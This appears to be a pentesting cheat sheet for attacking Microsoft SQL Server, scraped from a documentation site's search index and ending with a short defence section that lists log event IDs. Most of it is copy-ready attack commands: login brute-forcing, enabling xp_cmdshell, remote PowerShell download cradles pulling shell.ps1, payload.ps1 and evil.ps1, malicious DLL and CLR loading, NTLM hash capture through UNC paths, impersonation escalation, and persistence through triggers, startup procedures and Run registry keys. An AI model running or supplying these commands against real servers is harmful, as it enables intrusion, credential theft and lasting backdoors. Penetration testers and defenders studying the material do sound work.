Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013 Verbose -- Above is equivalent to: SELECT SUER_NAME ( 1 ) SELECT SUER_NAME ( 2 ) SELECT SUER_NAME ( 3 ) BruteForce: Get-SQLInstanceDomain | G ) et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $( Get-SQLInstanceDomain ). ComputerName comps | Invoke-BruteForce -UserList C : \\ dict \\ users . txt -PasswordList C : \\ dict \\ passwords . txt -Service SQL \u2013 Verbose Command Execution xp_cmdshell Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc xp_cmdshell , xplog70.dll Execute command: EXEC master .. xp_cmdshell whoami xp_cmdshell powershell iex ( New - Object System . Net . WebClient ). DownloadString ( \\ http://10.10.14.8/shell.ps1\\ ) Enable xp_cmdshell: mssqlclient . py has enable_xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 1 RECONFIGURE Disable xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 0 RECONFIGURE Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell: -- add user test to the master database USE [ master ] GO CREATE USER [ test ] FOR LOGIN [ test ] GO -- grant execute access to xp_cmdshell GRANT EXEC ON xp_cmdshell TO [ test ] Nishang: Execute - Command - MSSQL - ComputerName instance - UserName sa - Password pw PowerUpSQL: Invoke - SQLOSCmd - Username sa - Password pw - Instance instance - Command whoami Custom Extended Stored Procedures DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc . dll has a function called xp_calc :\\ sp_addextendedproc xp_calc , C:\\mydll\\xp_calc.dll EXEC xp_calc sp_dropextendedproc xp_calc Create-SQLFileXpDll -OutFile C : \\ fileserver \\ xp_calc . dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc xp_calc , \\\\192.168.15.2\\fileserver\\xp_calc.dll Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing Custom Extended Stored Procedures: Get-SQLStoredProcedureXP -Instance instance -Verbose Custom CLR Assemblies CLR ( Common Language Runtime ) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path References https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure show advanced options , 1 RECONFIGURE GO -- Enable clr on the server sp_configure clr enabled , 1 RECONFIGURE GO Create DLL: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe / target : library C : \\ Users \\ labuser \\ Desktop \\ cmd_exec . cs Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C : \\ Users \\ labuser \\ Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM \\\\192.168.15.2\\fileserver\\cmd_exec.dll WITH PERMISSION_SET = UNSAFE ; GO Import the assembly from string: CREATE ASSEMBLY [ NMfsa ] AUTHORIZATION [ dbo ] FROM 0 x4D5A90 ...... Link the assembly to a stored procedure CREATE PROCEDURE [ dbo ].[ cmd_exec ] @ execCommand NVARCHAR ( 4000 ) AS EXTERNAL NAME [ my_assembly ].[ StoredProcedures ].[ cmd_exec ]; GO Execution: cmd_exec whoami Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose OLE Automation Procedure Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. References: https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure show advanced options , 1 ; GO RECONFIGURE ; GO sp_configure Ole Automation Procedures , 1 ; GO RECONFIGURE ; GO Execute: DECLARE @ output INT DECLARE @ ProgramToRun VARCHAR ( 255 ) SET @ ProgramToRun = Run( calc.exe ) EXEC sp_oacreate wScript.Shell , @ output out EXEC sp_oamethod @ output , @ ProgramToRun EXEC sp_oadestroy @ output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/ -- Declare variables used to reference the objects DECLARE @ objLocator int , @ objWmi int , @ objPermiss int , @ objFull int ; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate WbemScripting.SWbemLocator , @ objLocator OUTPUT ; -- Use the SWbemLocator object s ConnectServer() method to connect to the -- local WMI server. The connection will be to the root\\cimv2 namespace EXEC sp_OAMethod @ objLocator , ConnectServer , @ objWmi OUTPUT , . , root\\cimv2 ; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for ftp.exe EXEC sp_OAMethod @ objWmi , Get , @ objPermiss OUTPUT , Win32_LogicalFileSecuritySetting.Path= ftp.exe ; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @ objWmi , Get , @ objFull OUTPUT , Win32_SecurityDescriptor ; -- Set the SecurityDescriptor s ControlFlags property to -- 4 (SE_DACL_PRESENT) EXEC sp_OASetProperty @ objFull , ControlFlags , 4 ; -- Set the file security setting object s security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @ objPermiss , SetSecurityDescriptor , NULL , @ objFull ; Agent Jobs (CmdExec, PowerShell, ActiveX etc.) Job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. References: https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent https://serverfault.com/a/14569 https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution Steps xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job Listing all Jobs** SELECT job . job_id , notify_level_email , name , enabled , description , step_name , command , server , database_name FROM msdb . dbo . sysjobs job INNER JOIN msdb . dbo . sysjobsteps steps ON job . job_id = steps . job_id Interesting subsystems (job types): PowerShell USE msdb EXEC dbo . sp_add_job @ job_name = N PSJob EXEC sp_add_jobstep @ job_name = N PSJob , @ step_name = N test_powershell_name1 , @ subsystem = N PowerShell , @ command = N powershell.exe -noexit ps , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N PSJob EXEC dbo . sp_start_job N PSJob -- EXEC dbo.sp_delete_job @job_name = N PSJob CmdExec USE msdb EXEC dbo . sp_add_job @ job_name = N cmdjob EXEC sp_add_jobstep @ job_name = N cmdjob , @ step_name = N test_cmd_name1 , @ subsystem = N cmdexec , @ command = N cmd.exe /k calc , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N cmdjob EXEC dbo . sp_start_job N cmdjob ; -- EXEC dbo.sp_delete_job @job_name = N cmdJob Microsoft ActiveX Script (VBScript and Jscript) SSIS (SQL Server Integrated Services) PowerUpSQL Invoke-SQLOSCmdAgentJob \u2013 Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe ] se External Scripting R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). References: https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure external scripts enabled GO EXEC sp_execute_external_script @ language = N R , @ script = N OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T)) WITH RESULT SETS (([ cmd_out ] text )); GO Grab Net-NTLM hashes with R: @ script = N .libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x ) Using shell instead of system: https://pastebin.com/zBDnzELT @ script = N OutputDataSet - data.frame(shell( dir ,intern=T)) Executing commands with Python: EXEC sp_execute_external_script @ language = N Python , @ script = N import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )]) WITH RESULT SETS (([ cmd_out ] nvarchar ( max ))) PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Registry Autoruns File Autoruns Privilege Escalation Find Impersonatable Accounts https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose Execute As https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () EXECUTE AS LOGIN = sa SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () Trustworthy Databases https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . Discover Trustworthy Databases SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose Exploitation Add sysadmin to myuser : EXECUTE AS USER = dbo SELECT system_user EXEC sp_addsrvrolemember example.com\\myuser , sysadmin Public to Service Account UNC Path Injection Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Invoke-SQLUncPathInjection -Verbose -CaptureIp 192 . 168 . 1 . 11 Service Account to System Rotten Potato https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. Extracting service account credentials from LSA Secrets and/or memory Token Impersonation for the SQL Server service Single user mode Lateral Movement Domain User accounts SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get - SQLInstanceDomain | Get - SQLServerInfo - Verbose For alternative credentials: runas / noprofile / netonly / user : domain \\ username powershell . exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests: Get - SQLFuzzDomainAccount - Instance instance - StartId 500 - EndId 2000 - Verbose If local admin rights are present, dump credentials. References: https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ Database Links Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests References: https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master .. sysservers Get - SQLServerLink - Instance instance - Verbose Run queries on linked databases: select - from openquery ( instance , select - frommaster..sysservers ) Run queries on chain of linked databases: select - from openquery ( inatance1 , select - from openquery( instance2 , select - from master..sysservers ) ) Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE ( sp_configure xp_cmdshell ,1;reconfigure; ) AT instance2 ) Command execution with linked databases: select - from openquery ( instance1 , select - from openquery( instance2 , select - from openquery( instance3 , select @@version as version;exec master..xp_cmdshell cmd /c calc.exe ) ) ) Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell cmd /c calc.exe -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/ Persistence Startup stored procedures sysadmin privileges are required to mark proc for automated execution Owned only by sa Must be in the master database Cannot have input or output parameters Gets executed with sysadmin privileges Executed when SQL Server restart References: https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO EXEC sp_procoption @ ProcName = sp_autops , @ OptionName = startup , @ OptionValue = on ; List: SELECT [ name ] FROM sysobjects WHERE type = P AND OBJECTPROPERTY ( id , ExecIsStartUp ) = 1 ; Triggers References: https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql Data Definition Language (DDL) Triggers Execute under the context of the user that calls the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups CREATE Trigger [ persistence_ddl_1 ] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO Data Manipulation Language (DML) Triggers Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers USE master GRANT IMPERSONATE ON LOGIN :: sa to [ Public ]; USE testdb CREATE TRIGGER [ persistence_dml_1 ] ON testdb . dbo . datatable FOR INSERT , UPDATE , DELETE AS EXECUTE AS LOGIN = sa EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO Logon Triggers Ideal for triggering with a logon failure of a low-privilege user. References: https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers CREATE Trigger [ persistence_logon_1 ] ON ALL SERVER WITH EXECUTE AS sa FOR LOGON AS BEGIN IF ORIGINAL_LOGIN () = testuser EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) END ; List all Triggers SELECT - FROM sys . server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose Registry keys xp_regwrite Needs sysadmin EXEC xp_regwrite @ rootkey = HKEY_LOCAL_MACHINE , @ key = Software\\Microsoft\\Windows\\CurrentVersion\\Run , @ value_name = SQLServerUpdate , @ type = REG_SZ , @ value = powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman . exe -Command c:\\windows\\system32\\cmd.exe -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) -Verbose xp_regread Limited read for public role References: https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ DECLARE @ Reg_Value VARCHAR ( 1000 ) EXECUTE xp_regread HKEY_LOCAL_MACHINE , SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion , \u2018 ProductName , @ Reg_Value OUTPUT SELECT @ Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose xp_regdeletekey Needs sysadmin References: https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal Defence Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program - Files \\ Microsoft SQL Server \\ MSSQL . 1 MSSQL \\ LOG \\ ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution) References https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"Databases sqlserver"},{"location":"databases-sqlserver/#quick-reference","text":"mssql-sql-injection-cheat-sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet Brute-forcing: hydra - l sa \u2013 P / path / to / rockyou . txt 10 . 10 . 10 . 125 mssql Nmap Enumeration: nmap \u2013script ms-sql and not ms-sql-brute \u2013script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all -d -oN mssql.nmap -Pn -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1434 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net user walter P@ssWORD1234 /add 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net localgroup administrators walter /add 10 .33.1.33 nmap -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1433 \u2013script ms-sql-query \u2013script-args mssql.username = sa,mssql.password = password,mssql.database = bankdb,ms-sql-query.query = SELECT * FROM tblCustomers 10 .33.1.33 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER $ip Capture hash: Run responder and do: xp_dirtree \\\\10.10.14.8\\test List all databases EXEC sp_databases ; select * from sysobjects where xtype = U ; Connect from Linux: sqsh - S someserver - U sa - P poiuytrewq - D bankdb Special Schemas: INFORMATION_SCHEMA sys DB Structure: SELECT name FROM master . dbo . sysdatabases SELECT * FROM orcharddb . INFORMATION_SCHEMA . SELECT * FROM orcharddb . INFORMATION_SCHEMA . COLUMNS SQL Injection Tips: Commenting: -- Important functions xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems +EXEC+master.sys.xp_dirtree+ \\\\ 10 . 10 . 14 . 9 \\ share -- Time based injection if (select user) = sa waitfor delay 0 : 0 : 5 -- if (select user) != sa waitfor delay 0 : 0 : 5 --","title":"Quick Reference"},{"location":"databases-sqlserver/#tools","text":"SQSH Accessing and Hacking MSSQL from Backtrack Linux Installation: apt - get install sqsh freetds - bin freetds - common freetds - dev Edit / etc / freetds / freetds . conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/ . sqshrc : \\ set username = sa \\ set password = password \\ set style = vert Run: sqsh - S MyServer sqsh - S { system name / IP } : { port num } - U { username } - P { password } List of available databases with: SELECT name FROM master .. sysdatabases go Build from source: $export SYBASE = /usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin","title":"Tools"},{"location":"databases-sqlserver/#roles-and-permissions","text":"","title":"Roles and Permissions"},{"location":"databases-sqlserver/#principals","text":"Principals are entities that can request SQL Server resources. SQL Server-level principals: SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role Database-level principals: Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST ; ) Database Role Application Role","title":"Principals"},{"location":"databases-sqlserver/#server-level-roles-and-permissions","text":"Fixed Roles sysadmin - Can perform any activity in the server. serveradmin - Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin - Can end processes that are running in an instance of SQL Server. setupadmin - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.) bulkadmin - Can run the BULK INSERT statement. diskadmin - Used for managing disk files. dbcreator - Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017 Working with Server-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles","title":"Server-Level Roles and Permissions"},{"location":"databases-sqlserver/#database-level-roles-and-permissions","text":"CREATE LOGIN ... WITH PASSWORD = ...; Fixed Roles db_owner Can perform all configuration and maintenance activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator - Can back up the database. db_ddladmin - Can run any Data Definition Language (DDL) command. db_datawriter - Can add, delete, or change data in all user tables. db_datareader - Can read all data from all user tables. db_denydatawriter - Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader - Cannot read any data in the user tables within a database. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017 Special Roles for SQL Database and SQL Data Warehouse Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager - Can create and delete logins in the virtual master database. Special Roles for msdb Database db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin - may be able to elevate their privileges to sysadmin [1] dc_admin dc_operator dc_proxy - Can administer and use the data collector. dc_admin may be able to elevate their privileges to sysadmin . [1] PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. ServerGroupAdministratorRole ServerGroupReaderRole - Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor . Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles Special Roles for R Services rpkgs - users - Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs - private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs - shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages. Working with Database-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles","title":"Database Level Roles and Permissions"},{"location":"databases-sqlserver/#application-roles","text":"Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole","title":"Application Roles"},{"location":"databases-sqlserver/#enumeration","text":"Direct Access SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient) Modules PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Discovery PowerUpSQL: Get - SQLInstanceScanUDP - ComputerName 192 . 168 . 1 . 2 - verbose .NET (UDP Broadcast): [ System . Data . Sql . SqlDataSourceEnumeration ]:: Instance . GetDataSources () Local Enumeration http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/ Import-Module -Name SQLPS Get-ChildItem SQLSERVER : \\ SQL \\ machinename Get-Service -Name MSSQL * sqlinstances = Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server foreach ( $SQLInstance in $SQLInstances ) { foreach ( $s in $SQLInstance . InstalledInstances ) { [PSCustomObject] @{ PSComputerName = $SQLInstance . PSComputerName InstanceName = $s }}} Get-SQLInstanceLocal Domain Enumeration Search AD user attribute: servicePrincipalName = MSSQL * Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object { $_ . is_encrypted -eq \u201c True } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose","title":"Enumeration"},{"location":"databases-sqlserver/#queries","text":"Version: SELECT @@version Current User: SELECT SUSER_SNAME () SELECT SYSTEM_USER Current Role: SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT user Current Database: SELECT db_name () List All Databases: SELECT name FROM master .. sysdatabases List All Logins: SELECT - FROM sys . server_principals WHERE type_desc != SERVER_ROLE List All Users for Database: SELECT - FROM sys . database_principals WHERE type_desc != DATABASE_ROLE List All Sysadmins: SELECT name , type_desc , is_disabled FROM sys . server_principals WHERE IS_SRVROLEMEMBER ( sysadmin , name ) = 1 List All Roles: SELECT DP1 . name AS DatabaseRoleName , isnull ( DP2 . name , No members ) AS DatabaseUserName FROM sys . database_role_members AS DRM RIGHT OUTER JOIN sys . database_principals AS DP1 ON DRM . role_principal_id = DP1 . principal_id LEFT OUTER JOIN sys . database_principals AS DP2 ON DRM . member_principal_id = DP2 . principal_id WHERE DP1 . type = R ORDER BY DP1 . name ; Effective Permissions for Server: SELECT - FROM fn_my_permissions ( NULL , SERVER ); Effective Permissions for Database: SELECT - FROM fn_my_permissions ( NULL , DATABASE ); Active User Tokens: SELECT - FROM sys . user_token Active Login Tokens: SELECT - FROM sys . login_token Impersonatable Accounts: SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Find Trustworthy Databases: SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases 